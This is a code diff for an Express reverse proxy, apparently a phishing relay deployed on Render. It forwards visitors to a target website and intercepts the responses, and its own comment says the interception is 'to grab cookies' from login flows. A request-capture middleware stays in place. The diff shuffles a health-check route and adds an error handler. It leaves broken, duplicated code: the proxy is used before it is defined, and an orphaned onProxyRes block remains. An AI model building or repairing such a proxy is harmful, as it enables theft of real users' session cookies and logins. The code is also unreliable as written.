@@ -57,23 +57,39 @@ const captureRequestData = (req, res, next) => {
 };
 // Add this block before the other app.use() calls
 
-// 6. Health Check Endpoint for Render
-// Render will call this URL to make sure the app is running.
-app.get('/health', (req, res) => {
-  res.status(200).send('OK');
-});
-
 // Now the rest of your middleware...
 // 6. Tell the Express app to use our middleware.
 app.use(captureRequestData);
 app.use('/', proxy);
 
+// ... (keep all the code above this the same)
+
 // 5. Proxy Middleware Configuration
 const proxy = createProxyMiddleware({
   target: TARGET_WEBSITE,
-  changeOrigin: true, // Needed for virtual hosted sites
-  followRedirects: true, // Important for login flows that redirect
-  selfHandleResponse: true, // We want to intercept the response to grab cookies
+  changeOrigin: true,
+  followRedirects: true,
+  selfHandleResponse: true,
+  onProxyRes: (proxyRes, req, res) => {
+    // ... (keep all the onProxyRes logic the same)
+  },
+  onError: (err, req, res) => {
+    console.error('[-] Proxy error:', err);
+    res.status(502).send('<h1>Proxy Error</h1><p>Could not connect to the target website.</p>');
+  }
+});
+
+// 6. Health Check Endpoint for Render
+// CORRECT LOCATION: It comes AFTER the proxy is defined.
+app.get('/health', (req, res) => {
+  res.status(200).send('OK');
+});
+
+// 7. Tell the Express app to use our middleware.
+app.use(captureRequestData);
+app.use('/', proxy);
+
+// ... (keep the app.listen part the same)
 
   // This function runs when the response comes back from the target website.
   onProxyRes: (proxyRes, req, res) => {
